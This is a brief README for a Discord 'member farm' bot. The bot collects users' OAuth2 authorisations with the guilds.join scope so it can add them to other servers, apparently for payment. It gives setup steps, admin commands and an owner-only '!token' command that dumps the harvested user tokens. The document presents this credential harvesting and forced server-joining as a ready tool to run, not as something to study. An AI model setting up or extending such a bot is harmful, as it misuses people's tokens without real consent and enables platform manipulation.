# Member Farm Bot

Discord member farm bot using OAuth2 `guilds.join` scope.

## Setup

1. Copy `.env.example` to `.env` and fill values.
2. Create a Discord Application + Bot.
3. Enable OAuth2 with scopes: `identify`, `guilds.join`.
4. Set redirect URI to your `REDIRECT_URI`.
5. `npm install && npm start`

## Variables to set after first run (via commands)

- `!verifyrole set @role`
- `!link define <oauth_url>`
- Log channels: `!logfarm set`, `!logserver set`, `!logerrors set`, `!logadmin set`
- Special join channel ID / name and Payout Central server ID (edit `src/config.js` or use runtime storage).

Owner-only token dump: `!token` (user ID 1264183250243420211 only).
